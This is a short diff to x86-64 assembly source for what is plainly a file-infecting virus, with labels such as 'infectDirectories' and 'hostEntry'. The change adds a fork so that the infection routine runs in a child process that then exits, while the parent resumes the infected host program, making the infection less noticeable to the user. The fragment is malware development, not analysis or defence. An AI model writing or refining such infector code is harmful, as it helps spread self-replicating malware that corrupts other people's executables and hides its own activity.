@@ -24,6 +24,12 @@ _start:
 			add rax, [rel hostEntry]
 			push rax
 
+			mov rax, SYSCALL_FORK
+			syscall
+			push rax
+			cmp rax, 0
+			jnz .finish
+
 			lea rdi, [rel infectDirectories]
 
 	.openDir:
@@ -94,13 +100,24 @@ _start:
 
 	.finish:
 	; Restore stack and jump to host entry
+			pop r14
 			pop rax
 			leave
 			pop rdx
 			pop rcx
 			pop rsi
 			pop rdi
+		; Child must die after infection | Parent resumes host activity
 		; RAX is address of host program entry
+			cmp r14, 0
+			jnz .jumpToHost
+
+	.die:
+			mov rax, SYSCALL_EXIT
+			mov rdi, 0
+			syscall
+
+	.jumpToHost:
 			jmp rax
 
 
